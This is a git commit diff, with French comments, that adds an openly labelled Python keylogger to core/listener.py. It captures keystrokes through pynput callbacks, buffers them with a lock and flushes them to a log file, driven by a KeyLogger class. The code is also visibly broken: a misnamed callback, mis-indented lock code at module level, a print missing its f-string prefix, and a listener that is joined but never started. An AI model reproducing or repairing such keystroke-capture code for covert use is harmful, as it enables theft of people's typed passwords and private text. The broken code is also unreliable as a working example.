509f4255fb78aae4f85d6e744f2315aded626a8c
lionel5678 <guillaule.castant@gmail.com>
2026-03-15 22:04:39 +0100

    find du listener

--- core/listener.py
+++ core/listener.py
@@ -33,4 +33,54 @@ def flush_buffer():
 
 # ── CALLBACKS : LE CŒUR DU LISTENER ─────────────────────────
 def onpress(key):
-    
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    key_str = format_key(key)
+    if key_str is None: #si pas reconue
+        return
+
+# ── THREAD SAFETY ──────────────────────────────────────
+with lock:
+    buffer.append(key_str) #pour eviter les donner corrompues
+    if len(buffer) >= BUFFER_SIZE:
+        flush_buffer()
+        print("[{timestamp}] Capturé : {key_str}")
+def on_release(key):
+    if key == keyboard.Key.esc:
+        print("\n[*] Touche ESC détectée — arrêt du listener.")
+
+    with lock:
+        if buffer:
+            flush_buffer()
+    return False
+
+# ── CLASSE PRINCIPALE : KeyLogger ───────────────────────────
+class KeyLogger:
+    def __init__(self):
+        self.listener = None 
+
+        self.is_running = False
+
+    def start(self):
+        print("[*] Démarrage du listener...")
+        print(f"[*] Logs écrits dans : {os.path.abspath(LOG_FILE)}")
+        print("[*]ESC pour stop.\n")
+        self.is_running = True
+
+        self.listener = keyboard.Listener(
+            on_press=on_press,
+            on_release=on_release
+        )
+
+        self.listener.join()
+
+        self.is_running = False
+        print("[*] arreté propre")
+
+    def stop(self):
+        if self.listener and self.is_running:
+            self.listener.stop()
+
+# ── POINT D'ENTRÉE (test standalone) ────────────────────────
+if __name__ == "__main__":
+    logger = KeyLogger()
+    logger.start()
